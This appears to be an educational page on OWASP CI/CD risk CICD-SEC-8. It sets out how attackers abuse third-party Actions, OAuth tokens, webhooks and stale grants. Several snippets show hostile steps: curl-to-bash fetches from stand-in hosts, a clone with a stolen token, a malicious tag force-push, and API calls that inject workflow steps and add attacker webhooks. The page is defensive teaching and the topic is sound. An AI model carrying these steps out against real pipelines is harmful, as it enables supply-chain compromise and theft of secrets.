# CICD-SEC-8: Ungoverned Usage of 3rd Party Services - Attack Vectors

## Table of Contents
- [Understanding Third-Party Attack Vectors](#understanding-third-party-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Third-Party Trust](#chaining-third-party-trust)

## Understanding Third-Party Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are described so you can find and fix ungoverned third-party access in systems you own or are authorised to test.

Attacks in this category rarely require breaking into your systems directly. Instead, the attacker **rides in on trust you already granted**: they compromise or impersonate a third party that your pipeline already lets in, or they abuse an over-scoped grant that no one is watching. Because the access is legitimate on paper, the malicious use blends into normal automation.

The attacker's goal is usually one of:

- Obtain the credentials of a trusted third party (its OAuth token, App key, or publishing account) and use them against you.
- Get their code to run inside your pipeline via a reusable Action, plugin, or template you adopted without vetting.
- Abuse an over-scoped, unmonitored integration to read source and secrets or write to repositories.

### Core Attack Flow

```
1. Identify the trust
   ↓
   Which Apps, OAuth grants, tokens, Actions, plugins, and bots can reach the target?
2. Compromise or abuse it
   ↓
   Breach the vendor, hijack the maintainer account, or use an over-scoped grant directly
3. Execute or read
   ↓
   Run code in the runner, or call the SCM/CI API with the third party's access
4. Harvest / Escalate / Persist
   ↓
   Exfiltrate source + secrets, pivot to cloud, add own webhooks/keys to stay in
```

## Common Attack Patterns

### 1. Compromised SaaS Service Running Inside the Build

A third-party tool invoked during CI (uploader, scanner, deploy helper) is tampered with at the source. Every customer that runs it executes the attacker's code with full access to the build environment.

```bash
# A build step everyone trusted:
- run: bash <(curl -s https://cdn.thirdparty.example/uploader.sh)   # fetched fresh each run

# If uploader.sh is modified upstream, this runs in YOUR job and can read:
#   env vars, CI secrets, cloud tokens, the checked-out source, the job token
```

**Payoff**: mass secret harvesting across the vendor's entire customer base—the Codecov-class pattern. No individual victim was targeted; they simply trusted a service that got breached.

### 2. OAuth / App Token Theft and Reuse

Attackers obtain the tokens an SCM platform issued to a popular third-party integration, then use those tokens to clone the private repositories of every org that authorized the integration.

```bash
# With a stolen integration token that has broad "repo" scope:
GET /user/repos?per_page=100          # enumerate every accessible repo
git clone https://x-access-token:STOLEN_TOKEN@scm.example/acme/private-app.git
# ...repeat across all victims that authorized the same integration
```

**Payoff**: bulk private-source-code theft—the GitHub-OAuth-token-abuse class. The victims did nothing wrong at authorize time; the broad, standing grant is what made the stolen token so valuable.

### 3. Malicious or Typosquatted Marketplace Component

A reusable Action, plugin, or orb with a name resembling a trusted one is published to a public marketplace and adopted by developers who do not check the author.

```yaml
# Looks legitimate; author is unknown and unverified:
- uses: actions-cache/cache@v1        # NOT the official actions/cache
- uses: setup-node-js/setup@v3        # lookalike of a trusted step
```

**Payoff**: the attacker's code runs in your runner from day one, reading secrets and the workspace and able to tamper with artifacts.

### 4. Maintainer Account Takeover + Tag Repointing

A legitimate, popular Action is referenced by a mutable tag. The attacker takes over the maintainer's account and moves the tag to malicious code.

```bash
# Your workflow, unchanged for months:
- uses: popular/build-step@v2

# Upstream, the attacker does:
git tag -f v2 <malicious-commit>
git push --force origin v2
# Your NEXT build silently runs the malicious v2.
```

**Payoff**: code execution in every pipeline that trusted `@v2`—retroactively weaponizing a dependency you already vetted, because you pinned a name instead of a commit.

### 5. Abusing an Over-Scoped, Unmonitored Integration

An integration was granted org-wide read/write "to be safe". An attacker who gains any foothold in the third party uses that scope directly.

```
# The integration only needed to read ONE repo, but holds:
#   Contents: read/write, All repositories, Webhooks: read/write
# Attacker uses the App credential to:
PUT /repos/acme/payments/contents/.github/workflows/ci.yml   # inject a step
POST /repos/acme/payments/hooks                              # add own webhook
```

**Payoff**: source modification, pipeline injection, and self-added persistence—all enabled by scope that was never needed.

### 6. Webhook Abuse (Inbound and Outbound)

Third-party webhooks are a two-way trust. Inbound webhooks can trigger pipeline actions; outbound webhooks ship data to the third party—and to anyone who compromises the endpoint or the secret.

```
# Outbound: build events (including secrets in payloads) sent to a vendor URL
POST https://hooks.thirdparty.example/ci    { "env": { ...leaked... } }

# Inbound: a forged or replayed event triggers a deploy if the signature is unchecked
POST /webhooks/deploy   X-Signature: (missing or not verified)
```

**Payoff**: data exfiltration through outbound hooks; unauthorized pipeline triggering through unverified inbound hooks.

### 7. Long-Lived Token Left With a Vendor

A broad, non-expiring personal access token was handed to a SaaS tool and stored on the vendor's servers. It keeps working long after the person who created it has left.

```
THIRD_PARTY_TOKEN = <classic PAT, repo scope, no expiry, created 3 years ago>
# Still valid. Still broad. Now sitting in a vendor's database.
```

**Payoff**: if the vendor is ever breached, the attacker inherits a powerful, un-rotated credential to your systems with no time pressure.

### 8. Transitive Component Compromise

A reusable Action you trust internally calls other Actions or downloads scripts at runtime from authors you never evaluated.

```yaml
# You use: trusted/deploy@<sha>
# Internally it does:
- uses: someone-else/helper@main               # you never saw this dependency
- run: curl -s https://example.net/tool | bash # fetched fresh, unverifiable
```

**Payoff**: compromise of a component two hops away still runs in your runner. Pinning only the top layer leaves the sub-dependencies mutable.

### 9. Malicious Pull Request Triggering a Trusted Integration

Bots and integrations that act on pull requests can be tricked by a hostile PR into running with elevated access or leaking secrets into a fork-visible context.

```yaml
# A fork PR modifies a config the integration reads, or targets a workflow that
# runs with repository secrets on pull_request_target:
on: pull_request_target        # runs in the context of the BASE repo, with secrets
# Attacker's PR code now executes with the trusted integration's access.
```

**Payoff**: an external contributor turns a trusted automation into a secret-exfiltration or code-execution primitive.

### 10. Stale & Forgotten Grants

Integrations from abandoned projects, departed employees, or one-off experiments remain authorized indefinitely because no one reviews them.

```
Deploy key added for a 2022 migration      -> still present, still write-capable
OAuth grant from a former contractor's app  -> still authorized org-wide
Bot for a deprecated service                -> still able to push
```

**Payoff**: an attacker who finds any of these gets working access that no one is watching—the ideal path for quiet, long-term abuse.

## Chaining Third-Party Trust

Individually minor lapses combine into full pipeline compromise:

```
Unpinned third-party Action (@v2)     -> maintainer account is taken over
        +
Tag repointed to malicious code       -> runs in your runner with secrets in scope
        +
Runner holds a broad cloud deploy key -> attacker assumes it and reaches production
        =  supply-chain compromise of your product, no bug in your own code
```

Another common chain:

```
Breached SaaS vendor holds your repo token -> attacker clones all private source
        -> source contains a committed CI secret
        -> secret used against an over-scoped, unmonitored integration
        -> integration writes a malicious workflow + adds its own webhook (persistence)
```

## Key Takeaways

1. **Attackers ride in on trust you granted**—they compromise a third party rather than breaking in directly.
2. **Mutable references are time bombs**—a tag or branch can be repointed to malicious code after you adopt it.
3. **Broad, standing grants are the prize**—over-scoped tokens and Apps turn one vendor breach into a mass event.
4. **Anything running in a job can read its secrets**—a trusted step is a trusted execution of someone else's code.
5. **Forgotten access is the softest target**—stale grants are abused precisely because no one is watching them.

## Next Steps

- **[Prevention Guide](prevention.md)**: Inventory, scope, pin, allow-list, review, and monitor
- **[Code Examples](examples.md)**: Ungoverned vs. governed integrations side by side
- **[CI/CD Security Track](/learn/cicd)**: Continue with the rest of the OWASP CI/CD Top 10
- **[Practice](/practice)**: Apply these controls in hands-on exercises
